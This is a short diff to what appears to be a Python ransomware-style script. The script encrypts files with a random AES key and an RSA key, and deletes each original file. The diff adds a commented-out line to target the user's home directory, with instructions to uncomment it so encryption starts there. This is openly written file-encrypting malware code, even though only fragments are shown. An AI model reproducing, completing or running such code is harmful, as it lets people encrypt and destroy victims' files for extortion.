@@ -5,6 +5,7 @@ import shutil
 from Crypto.PublicKey import RSA
 from Crypto.Random import get_random_bytes
 from base64 import b64decode,b64encode
+from pathlib import Path
 
 def encrypt(key,path):
 
@@ -49,7 +50,12 @@ def encrypt(key,path):
 
             os.remove(f"{fil}")
 
-#key = os.urandom(16)
+
+home = str(Path.home())
+#os.chdir(home) -------> uncomment this to start encryption from the home directory or 
+			#else the script encrypts from the directory where the script is present 
+	
+
 key = get_random_bytes(16)
 
 #generating rsa private key
